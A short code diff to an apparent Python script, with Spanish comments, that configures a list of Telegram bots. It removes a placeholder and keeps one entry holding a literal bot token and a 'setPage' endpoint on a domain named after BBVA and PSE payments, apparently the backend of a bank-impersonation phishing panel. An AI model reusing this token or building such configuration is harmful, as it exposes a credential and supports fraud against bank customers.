@@ -3,8 +3,7 @@ import requests
 import threading
 # Credenciales de los bots
 BOTS = [
-    {"token": "7695570773:AAFT410wCwuCwFBOPBZxwYqJTdCRiiFSUms", "server_url": "https://bbvapsepagos.onrender.com/setPage"},
-    {"token": "token", "server_url": "url/setPage"}
+    {"token": "7695570773:AAFT410wCwuCwFBOPBZxwYqJTdCRiiFSUms", "server_url": "https://bbvapsepagos.onrender.com/setPage"}
 ]
 
 # Diccionario para manejar múltiples bots
